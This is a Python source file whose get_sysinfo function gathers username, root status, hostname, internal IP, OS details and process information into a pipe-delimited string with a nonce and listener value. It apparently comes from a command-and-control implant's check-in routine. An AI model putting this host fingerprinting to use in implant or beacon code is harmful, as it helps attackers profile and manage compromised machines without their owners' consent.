import os
import sys
import pwd
import socket
import subprocess

def get_sysinfo(nonce='00000000'):
    # NOTE: requires global variable "server" to be set

    # nonce | listener | domainname | username | hostname | internal_ip | os_details | os_details | high_integrity | process_name | process_id | language | language_version
    __FAILED_FUNCTION = '[FAILED QUERY]'

    try:
        username = pwd.getpwuid(os.getuid())[0].strip("\\")
    except Exception as e:
        username = __FAILED_FUNCTION
    try:
        uid = os.popen('id -u').read().strip()
    except Exception as e:
        uid = __FAILED_FUNCTION
    try:
        highIntegrity = "True" if (uid == "0") else False
    except Exception as e:
        highIntegrity = __FAILED_FUNCTION
    try:
        osDetails = os.uname()
    except Exception as e:
        osDetails = __FAILED_FUNCTION
    try:
        hostname = osDetails[1]
    except Exception as e:
        hostname = __FAILED_FUNCTION
    try:
        internalIP = socket.gethostbyname(socket.gethostname())
    except Exception as e:
        try:
            internalIP = os.popen("ifconfig|grep inet|grep inet6 -v|grep -v 127.0.0.1|cut -d' ' -f2").read()
        except Exception as e1:
            internalIP = __FAILED_FUNCTION
    try:
        osDetails = ",".join(osDetails)
    except Exception as e:
        osDetails = __FAILED_FUNCTION
    try:
        processID = os.getpid()
    except Exception as e:
        processID = __FAILED_FUNCTION
    try:
        temp = sys.version_info
        pyVersion = "%s.%s" % (temp[0], temp[1])
    except Exception as e:
        pyVersion = __FAILED_FUNCTION

    language = 'python'
    cmd = 'ps %s' % (os.getpid())
    ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    out = ps.stdout.read()
    parts = out.split("\n")
    ps.stdout.close()
    if len(parts) > 2:
        processName = " ".join(parts[1].split()[4:])
    else:
        processName = 'python'

    return "%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s" % (nonce, server, '', username, hostname, internalIP, osDetails, highIntegrity, processName, processID, language, pyVersion)
